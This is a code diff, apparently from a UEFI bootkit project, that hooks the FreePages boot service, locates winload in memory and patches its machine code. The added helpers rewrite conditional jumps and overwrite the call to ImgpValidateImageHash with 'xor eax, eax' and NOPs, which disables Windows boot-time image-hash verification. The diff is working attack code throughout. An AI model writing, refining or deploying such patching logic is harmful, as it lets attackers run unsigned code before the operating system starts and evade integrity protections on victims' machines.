@@ -118,6 +118,163 @@ STATIC BOOL DoesPathContainWinload( PRSDS_DEBUG_FORMAT Rsd, UINT32 DebugDataSize
     return FALSE;
 }
 
+STATIC BOOL PatchLegacyShortBranch( PUINT8 Address )
+{
+    if ( Address[ 0x00 ] == 0xC1 &&
+         Address[ 0x03 ] == 0xC7 &&
+         Address[ 0x04 ] == 0x74 )
+    {
+        *( Address + 0x04 ) = ( UINT8 )0xEB;
+        return TRUE;
+    }
+
+    return FALSE;
+}
+
+STATIC BOOL PatchShortConditionalJump( PUINT8 Address, PUINT8 Base, UINTN Size )
+{
+    if ( Address[ 0 ] != 0x74 )
+    {
+        return FALSE;
+    }
+
+    CONST INT8 Offset = ( INT8 )Address[ 1 ];
+    PUINT8     Target = Address + 0x02 + Offset;
+
+    if ( Target < Base || Target >= ( Base + Size ) )
+    {
+        return FALSE;
+    }
+
+    *( Address + 0x00 ) = ( UINT8 )0xEB;
+    return TRUE;
+}
+
+STATIC BOOL PatchNearConditionalJump( PUINT8 Address, PUINT8 Base, UINTN Size )
+{
+    if ( Address[ 0 ] != 0x0F )
+    {
+        return FALSE;
+    }
+
+    if ( Address[ 1 ] != 0x84 &&
+         Address[ 1 ] != 0x85 )
+    {
+        return FALSE;
+    }
+
+    INT32  Offset = *( PINT32 )( Address + 0x02 );
+    PUINT8 Target = Address + 0x06 + Offset;
+
+    if ( Target < Base || Target >= ( Base + Size ) )
+    {
+        return FALSE;
+    }
+
+    *( Address + 0x00 ) = ( UINT8 )0xE9;
+    *( PINT32 )( Address + 0x01 ) = Offset + 1;
+    *( Address + 0x05 ) = ( UINT8 )0x90;
+
+    return TRUE;
+}
+
+STATIC BOOL PatchConditionalJumpAround( PUINT8 Address, PUINT8 Base, UINTN Size )
+{
+    for ( INT Offset = -0x40 ; Offset <= 0x40 ; ++Offset )
+    {
+        PUINT8 Candidate = Address + Offset;
+
+        if ( Candidate < Base || Candidate >= ( Base + Size ) )
+        {
+            continue;
+        }
+
+        if ( PatchLegacyShortBranch( Candidate ) )
+        {
+            return TRUE;
+        }
+
+        if ( PatchShortConditionalJump( Candidate, Base, Size ) )
+        {
+            return TRUE;
+        }
+
+        if ( PatchNearConditionalJump( Candidate, Base, Size ) )
+        {
+            return TRUE;
+        }
+    }
+
+    return FALSE;
+}
+
+STATIC BOOL PatchValidateCall( PUINT8 Address, PUINT8 Base, UINTN Size )
+{
+    if ( Address[ 0 ] != 0xE8 )
+    {
+        return FALSE;
+    }
+
+    INT32  Disp   = *( PINT32 )( Address + 0x01 );
+    PUINT8 Target = Address + 0x05 + Disp;
+    PUINT8 After  = Address + 0x05;
+    UINT32 TestLength = 0;
+
+    if ( Target < Base || Target >= ( Base + Size ) )
+    {
+        return FALSE;
+    }
+
+    if ( After[ 0 ] == 0x84 && After[ 1 ] == 0xC0 )
+    {
+        TestLength = 0x02;
+    }
+    else if ( After[ 0 ] == 0x85 && After[ 1 ] == 0xC0 )
+    {
+        TestLength = 0x02;
+    }
+    else if ( After[ 0 ] == 0x48 && After[ 1 ] == 0x85 && After[ 2 ] == 0xC0 )
+    {
+        TestLength = 0x03;
+    }
+
+    if ( TestLength == 0 )
+    {
+        return FALSE;
+    }
+
+    PUINT8 Branch = After + TestLength;
+
+    if ( Branch < Base || Branch >= ( Base + Size ) )
+    {
+        return FALSE;
+    }
+
+    BOOL HasBranch = FALSE;
+
+    if ( Branch[ 0 ] == 0x74 )
+    {
+        HasBranch = TRUE;
+    }
+    else if ( Branch[ 0 ] == 0x0F &&
+              ( Branch[ 1 ] == 0x84 || Branch[ 1 ] == 0x85 ) )
+    {
+        HasBranch = TRUE;
+    }
+
+    if ( !HasBranch )
+    {
+        return FALSE;
+    }
+
+    *( PUINT16 )( Address + 0x00 ) = ( UINT16 )0xC031;
+    *( Address + 0x02 )            = ( UINT8 )0x90;
+    *( Address + 0x03 )            = ( UINT8 )0x90;
+    *( Address + 0x04 )            = ( UINT8 )0x90;
+
+    return TRUE;
+}
+
 /*!
  *
  * Purpose:
@@ -189,33 +346,35 @@ D_SEC( B ) EFI_STATUS EFIAPI FreePagesHook( IN EFI_PHYSICAL_ADDRESS Memory, IN U
             if ( DoesPathContainWinload( Rsd, Dbg->SizeOfData ) )
             {
                 /* Yes! - Set up the pointer to the base of the PE image */
+                BOOL  BranchPatched = FALSE;
+                BOOL  CallPatched   = FALSE;
+
                 Adr = C_PTR( U_PTR( Dos ) );
 
                 while ( U_PTR( Adr ) < U_PTR( Dos ) + Nth->OptionalHeader.SizeOfImage )
                 {
-                    /* jz short loc_180096FBF -> jmp short loc_180096FBF */
-                    if ( Adr[ 0x00 ] == 0xC1 &&
-                         Adr[ 0x03 ] == 0xC7 &&
-                         Adr[ 0x04 ] == 0x74 )
+                    if ( !BranchPatched && PatchLegacyShortBranch( Adr ) )
                     {
-                        *( PUINT8 )( U_PTR( Adr + 0x04 ) ) = ( UINT8 )( 0xEB ); /* jmp */
+                        BranchPatched = TRUE;
                     }
 
-                    /* call ImgpValidateImageHash -> xor eax, eax */
-                    if ( Adr[ 0x00 ] == 0xD8 &&
-                         Adr[ 0x01 ] == 0x3D &&
-                         Adr[ 0x02 ] == 0x2D )
+                    if ( !CallPatched && PatchValidateCall( Adr, C_PTR( Dos ), Nth->OptionalHeader.SizeOfImage ) )
                     {
-                        *( PUINT16 )( U_PTR( Adr - 0x06 ) ) = ( UINT16 )( 0xC031 ); /* xor eax, eax */
-                        *( PUINT8 ) ( U_PTR( Adr - 0x04 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
-                        *( PUINT8 ) ( U_PTR( Adr - 0x03 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
-                        *( PUINT8 ) ( U_PTR( Adr - 0x02 ) ) = ( UINT8 ) ( 0x90 );   /* nop */
+                        CallPatched   = TRUE;
+                        BranchPatched = BranchPatched ||
+                                        PatchConditionalJumpAround( Adr, C_PTR( Dos ), Nth->OptionalHeader.SizeOfImage );
+                    }
 
-                        /* Restore the original routine */
-                        Gen->SystemTable->BootServices->FreePages = C_PTR( Gen->FreePages );
+                    if ( CallPatched )
+                    {
+                        if ( BranchPatched )
+                        {
+                            /* Restore the original routine */
+                            Gen->SystemTable->BootServices->FreePages = C_PTR( Gen->FreePages );
 
-                        /* Quit! */
-                        goto LEAVE;
+                            /* Quit! */
+                            goto LEAVE;
+                        }
                     }
 
                     /* Move to next opcode */
